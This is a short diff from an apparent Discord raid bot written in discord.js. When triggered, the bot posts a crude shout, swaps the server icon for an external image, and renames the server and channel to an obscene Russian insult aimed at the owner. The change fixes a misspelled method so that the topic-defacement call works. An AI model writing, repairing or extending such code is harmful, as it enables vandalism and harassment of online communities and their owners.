@@ -244,7 +244,7 @@ client.on('message', async (message) => {
 	message.channel.send("ЕБОШЬЬЬЬЬЬ")
         message.channel.guild.setIcon('https://cdn.discordapp.com/attachments/459062113025916951/459064114761695233/1517860062.jpg')
         message.channel.guild.setName('ОВНЕР ХУЙ САСИ')
-        message.channel.setTolic('ОВНЕР ХУЙ САСИ')
+        message.channel.setTopic('ОВНЕР ХУЙ САСИ')
         message.channel.setName('ОВНЕР ХУЙ САСИ')
 	    /*
 	    ВНИМАНИЕ
